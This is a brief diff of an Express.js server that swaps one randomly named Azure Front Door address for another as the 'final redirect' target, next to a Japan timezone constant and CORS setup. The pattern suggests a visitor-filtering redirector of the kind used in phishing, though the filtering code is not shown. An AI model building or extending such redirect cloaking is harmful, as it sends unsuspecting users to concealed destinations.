@@ -2,7 +2,7 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://js-cdn-endpoint-hfecfwcteya4hhfy.z02.azurefd.net/";
+const FINAL_REDIRECT_URL = "https://asfsfy2727-d2czbseharh2a8hy.z02.azurefd.net/";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ CORS middleware (required for fetch)
